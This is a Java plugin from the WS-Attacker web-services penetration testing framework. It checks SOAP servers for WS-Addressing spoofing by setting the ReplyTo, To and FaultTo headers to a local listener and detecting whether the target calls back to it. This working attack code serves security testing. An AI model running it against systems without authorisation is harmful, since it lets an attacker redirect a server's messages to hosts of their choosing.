/*
 * WS-Attacker - A Modular Web Services Penetration Testing Framework
 * Copyright (C) 2010  Christian Mainka
 * 
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */

/**
 * 
 */
package wsattacker.plugin.wsAddressingSpoofing;

import javax.xml.soap.SOAPException;
import javax.xml.soap.SOAPMessage;

import wsattacker.main.composition.plugin.AbstractPlugin;
import wsattacker.main.composition.plugin.option.AbstractOption;
import wsattacker.main.composition.plugin.option.AbstractOptionInteger;
import wsattacker.main.composition.plugin.option.AbstractOptionVarchar;
import wsattacker.main.composition.testsuite.RequestResponsePair;
import wsattacker.main.plugin.PluginState;
import wsattacker.main.plugin.option.OptionLimitedInteger;
import wsattacker.main.plugin.option.OptionSimpleVarchar;
import wsattacker.plugin.wsAddressingSpoofing.option.OptionIpChooser;
import wsattacker.plugin.wsAddressingSpoofing.util.MicroHttpServer;
import wsattacker.util.SoapUtilities;

import com.eviware.soapui.config.WsaVersionTypeConfig;
import com.eviware.soapui.impl.wsdl.WsdlRequest;
import com.eviware.soapui.impl.wsdl.WsdlSubmit;
import com.eviware.soapui.impl.wsdl.WsdlSubmitContext;
import com.eviware.soapui.impl.wsdl.support.soap.SoapVersion;
import com.eviware.soapui.impl.wsdl.support.wsa.WsaConfig;
import com.eviware.soapui.impl.wsdl.support.wsa.WsaUtils;
import com.eviware.soapui.model.iface.Request.SubmitException;
import com.eviware.soapui.model.iface.Submit.Status;
import com.eviware.soapui.model.propertyexpansion.DefaultPropertyExpansionContext;
import com.eviware.soapui.support.xml.XmlUtils;

/**
 * @author Christian Mainka
 * 
 */
public class WsAddressingSpoofing extends AbstractPlugin {

	private static final long serialVersionUID = 1L;

	private OptionIpChooser chooser;
	private AbstractOptionInteger port;
	private AbstractOptionInteger waitingPerRequest;
	private AbstractOptionVarchar localServerUrl;
	private transient MicroHttpServer server; // for loading a config, only options are important
	private transient WsdlRequest attackRequest, originalRequest; // for loading a config, only options are important
	private boolean wasSuccessfulReplyTo, wasSuccessfulTo,
			wasSuccessfulFaultTo;

	/*
	 * (non-Javadoc)
	 * 
	 * @see wsattacker.main.composition.plugin.AbstractPlugin#initializePlugin()
	 */
	@Override
	public void initializePlugin() {
		port = new OptionLimitedInteger("Port", 10080,
				"Lokal server listens on this port", 1, 65536);
		waitingPerRequest = new OptionLimitedInteger("Waiting", 3000,
				"Maximum time to wait per request in ms (>=3000ms)",3000,3600000); // max=1h, just any value
		localServerUrl = new OptionSimpleVarchar("Endpoint",
				"http://your-server-ip:10080", // will be automatically overwritten
				"This is the URL for your local Server.");
		chooser = new OptionIpChooser("Your IP",
				"Detect Endpoint automaticly or choose it manually",
				localServerUrl, port);
		getPluginOptions().add(chooser).add(port).add(localServerUrl)
				.add(waitingPerRequest);
		setState(PluginState.Ready);
		server = null;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see wsattacker.main.composition.plugin.AbstractPlugin#getName()
	 */
	@Override
	public String getName() {
		return "WS-Addressing Spoofing";
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see wsattacker.main.composition.plugin.AbstractPlugin#getDescription()
	 */
	@Override
	public String getDescription() {
		return "This attack plugin checks if the server is vulnerable to WS-Addressing Spoofing.\n"
				+ "It will generate requests which try to invoke the server to send a message to your local server.\n"
				+ "This can be very dangerous.";
	}

	@Override
	public String[] getCategory() {
		return new String[] { "Spoofing Attacks" };
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see wsattacker.main.composition.plugin.AbstractPlugin#getAuthor()
	 */
	@Override
	public String getAuthor() {
		return "Christian Mainka";
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see wsattacker.main.composition.plugin.AbstractPlugin#getVersion()
	 */
	@Override
	public String getVersion() {
		return "1.0 - 30.11.2010";
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see wsattacker.main.composition.plugin.AbstractPlugin#getMaxPoints()
	 */
	@Override
	public int getMaxPoints() {
		return 3;
	}

	public AbstractOptionInteger getPort() {
		return port;
	}

	public AbstractOptionVarchar getLocalServerUrl() {
		return localServerUrl;
	}

	public AbstractOptionInteger getWaitingPerRequest() {
		return waitingPerRequest;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see
	 * wsattacker.main.composition.plugin.AbstractPlugin#attackImplementationHook
	 * (wsattacker.main.composition.testsuite.RequestResponsePair)
	 */
	@Override
	protected void attackImplementationHook(RequestResponsePair original) {
		originalRequest = original.getWsdlRequest();

		// start a micro http server for receiving http data
		// try {
		server = new MicroHttpServer(getPort().getValue());
		// } catch (IOException e) {
		// log().error("Could not start lokal server. Port already in use? " +
		// e.getMessage());
		// setState(PluginState.FAILED);
		// return;
		// }
		info("Starting MicroHttpServer on port " + getPort().getValue());
		server.start();

		// wait one second till server is started
		try {
			Thread.sleep(1000);
		} catch (InterruptedException e) {
			log().error(e.getMessage());
		}

		// check if server is listening
		try {
			server.getServer().getAddress();
		} catch (Exception e) {
			log().error("Could not start lokal server. Port already in use?");
			setState(PluginState.Failed);
			return;
		}
		// run different attack types
		// note: isRunning() is faster than !isAborting()
		if (isRunning()) {
			doReplyToAttack();
		} else {
			return;
		}
		if (isRunning()) {
			doToAttack();
		} else {
			return;
		}
		if (isRunning()) {
			doFaulToAttack();
		} else {
			return;
		}

		if (wasSuccessful()) {
			critical(String.format("(%d/%d) attack methods worked. The server is vulerable to WS-Addressing Spoofing.", getCurrentPoints(), getMaxPoints()));
		}

		server.stop();
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see wsattacker.main.composition.plugin.AbstractPlugin#clean()
	 */
	@Override
	public void clean() {
		setCurrentPoints(0);
		wasSuccessfulReplyTo = false;
		wasSuccessfulTo = false;
		wasSuccessfulFaultTo = false;
		removeAttackRequest(); // should normally do nothing
		setState(PluginState.Ready);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see wsattacker.main.composition.plugin.AbstractPlugin#stopAttack()
	 */
	@Override
	protected void stopHook() {
		removeAttackRequest();
		try {
			server.stop();
		}
		catch (Exception e) {
			// nothing to do
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see wsattacker.main.composition.plugin.AbstractPlugin#wasSuccessful()
	 */
	@Override
	public boolean wasSuccessful() {
		return (getCurrentPoints() > 0);
	}

	// usefull for junit
	public boolean wasSuccessfulReplyTo() {
		return wasSuccessfulReplyTo;
	}

	// usefull for junit
	public boolean wasSuccessfulTo() {
		return wasSuccessfulTo;
	}

	// usefull for junit
	public boolean wasSuccessfulFaultTo() {
		return wasSuccessfulFaultTo;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see
	 * wsattacker.main.composition.plugin.AbstractPlugin#optionValueChanged(
	 * wsattacker.main.composition.plugin.option.AbstractOption)
	 */
	@Override
	public void optionValueChanged(AbstractOption option) {

	}

	private void createAttackRequest(String newName) {
		attackRequest = originalRequest.getOperation().addNewRequest(newName);
		originalRequest.copyTo(attackRequest, true, true);
	}

	private void removeAttackRequest() {
		if (attackRequest != null) {
			attackRequest.getOperation().removeRequest(attackRequest);
			attackRequest = null;
		}
	}

	private boolean configureFaultAttack() {
		WsaConfig wsa = attackRequest.getWsaConfig();
		attackRequest.setWsaEnabled(true);

		// delete all body child elements so that this message
		// will cause a soap fault
		String content = attackRequest.getRequestContent();
		SOAPMessage sm;
		// convert string to SAAJ Objects
		try {
			sm = SoapUtilities.stringToSoap(content);
		} catch (SOAPException e) {
			log().error(
					"Could not convert String to SAAJ Objects. "
							+ e.getMessage());
			return false;
		}
		// remove all childs from body
		try {
			sm.getSOAPBody().removeContents();
		} catch (SOAPException e) {
			log().error("Could not remove SOAP body childs." + e.getMessage());
			return false;
		}
		// convert SAAJ back to String
		try {
			content = SoapUtilities
					.soapToString(sm.getSOAPPart().getEnvelope());
		} catch (SOAPException e) {
			log().error(
					"Could not convert SAAJ Objects back to a String. "
							+ e.getMessage());
			return false;
		}
		// set modified request content
		attackRequest.setRequestContent(content);

		// info("Using FaultTo Method and sending an empty body to the server");
		// server shall send soap fault to local server
		wsa.setFaultTo(getLocalServerUrl().getValue());
		// generate a random messageid
		// wsa.setGenerateMessageId(true);
		wsa.setMessageID("### FaultTo Message ID ###");
		return true;
	}

	private boolean configureToAttack() {
		WsaConfig wsa = attackRequest.getWsaConfig();
		attackRequest.setWsaEnabled(true);

		// server shall send the reply to local server
		wsa.setTo(getLocalServerUrl().getValue());
		// generate a random messageid
		// wsa.setGenerateMessageId(true);
		wsa.setMessageID("### To Message ID ###");

		return true;
	}

	private boolean configureReplyToAttack() {
		WsaConfig wsa = attackRequest.getWsaConfig();
		attackRequest.setWsaEnabled(true);

		// server shall send the reply to local server
		wsa.setReplyTo(getLocalServerUrl().getValue());
		// generate a random messageid
		// wsa.setGenerateMessageId(true);
		wsa.setMessageID("### ReplyTo Message ID ###");

		return true;
	}

	private boolean doAttackRequest() {
		final int STEP = 100;

		server.resetIncomingRequest();

		try {
			SoapVersion soapVersion = attackRequest.getOperation()
					.getInterface().getSoapVersion();
			String content = attackRequest.getRequestContent();
			WsaUtils wsaUtils = new WsaUtils(content, soapVersion,
					attackRequest.getOperation(),
					new DefaultPropertyExpansionContext(attackRequest));
			content = wsaUtils.addWSAddressingRequest(attackRequest);
			attackRequest.setRequestContent(content);
		} catch (Exception e) {
			log().error("Could not add WS-Addressing Header. " + e.getMessage());
			return false;
		}

		trace("Sending request with content (PrettyPrinted):\n"
				+ XmlUtils.prettyPrintXml(attackRequest.getRequestContent()));

		WsdlSubmit<WsdlRequest> submit = null;
		;
		try {
			submit = attackRequest.submit(new WsdlSubmitContext(attackRequest),
					true);
		} catch (SubmitException e) {
			log().error("Could not submit request." + e.getMessage());
			return false;
		}
		int wait = waitingPerRequest.getValue();
		boolean success = false;
		// wait until waiting time is over or we got a response
		while ((wait > 0) && !success && isRunning()) {
			try {
				Thread.sleep(STEP);
			} catch (InterruptedException e) {
			}
			wait -= STEP;
			success |= server.hasIncomingRequest();
		} 
		if (isAborting()) {
			info("User cancled attack.");
			return false;
		}
		submit.waitUntilFinished();
		if (success) {
			trace("Server received data (PrettyPrinted): \n"
					+ XmlUtils.prettyPrintXml(server.getRequestBody()));
		} else if (submit.getStatus().equals(Status.FINISHED)) {
			String response = submit.getResponse().getContentAsString();
			if (response == null) {
				info("Web-Server does not send anything to local server, neither replied to us directly. Is the endpoit reachable?");
			} else {
				info("Web-Server does not send anything to local server, but we directly received an reply.");
				trace("Reply content:\n" + response);
			}
		}
		return success;
	}

	private boolean doReplyToAttack() {
		boolean success;
		info("Trying to attack using 'ReplyTo' method");
		// ReplyTo attack
		createAttackRequest(getName() + " ReplyToAttack");
		configureReplyToAttack();
		success = doAttackRequest();
		// try again with other WSA version if not successful
		if (!success && toggleWsaVersion()) {
			success = doAttackRequest();
		}
		removeAttackRequest();
		// generate results
		if (success) {
			addOnePoint();
			wasSuccessfulReplyTo = true;
			important(String.format("%s attack works, got %d/%d Points",
					"ReplyTo", getCurrentPoints(), getMaxPoints()));
		} else {
			info("'ReplyTo' attack failed.");
		}
		return success;
	}

	private boolean doToAttack() {
		boolean success;
		info("Trying to attack using 'To' method");
		// To attack
		createAttackRequest(getName() + " ToAttack");
		configureToAttack();
		success = doAttackRequest();
		// try again with other WSA version if not successful
		if (!success && toggleWsaVersion()) {
			success = doAttackRequest();
		}
		removeAttackRequest();
		// generate results
		if (success) {
			addOnePoint();
			wasSuccessfulTo = true;
			important(String.format("%s attack works, got %d/%d Points", "To",
					getCurrentPoints(), getMaxPoints()));
		} else {
			info("'To' attack failed.");
		}
		return success;
	}

	private boolean doFaulToAttack() {
		boolean success;
		info("Trying to attack using 'FaultTo' method (request will have empty SOAP Body)");
		// try to invoke a soap fault
		createAttackRequest(getName() + " FaultAttack");
		configureFaultAttack();
		success = doAttackRequest();
		// try again with other WSA version if not successful
		if (!success && toggleWsaVersion()) {
			success = doAttackRequest();
		}
		removeAttackRequest();
		// generate results
		if (success && isRunning()) {
			addOnePoint();
			wasSuccessfulFaultTo = true;
			important(String.format("%s attack works, got %d/%d Points",
					"FaultTo", getCurrentPoints(), getMaxPoints()));
		} else {
			info("'FaulTo' attack failed.");
		}
		return success;
	}

	private boolean toggleWsaVersion() {
		WsaConfig wsa = attackRequest.getWsaConfig();
		String currentVersion = wsa.getVersion();
		String newVersion = null;
		boolean ret = false;
		if (currentVersion.equals(WsaVersionTypeConfig.X_200508.toString())) {
			newVersion = WsaVersionTypeConfig.X_200408.toString();
			ret = true;
		} else if (currentVersion.equals(WsaVersionTypeConfig.X_200408
				.toString())) {
			newVersion = WsaVersionTypeConfig.X_200508.toString();
			ret = true;
		}
		if (ret) {
			info("Changing WSA Version from " + currentVersion + " to "
					+ newVersion);
			wsa.setVersion(newVersion);
		}
		return ret;
	}
}
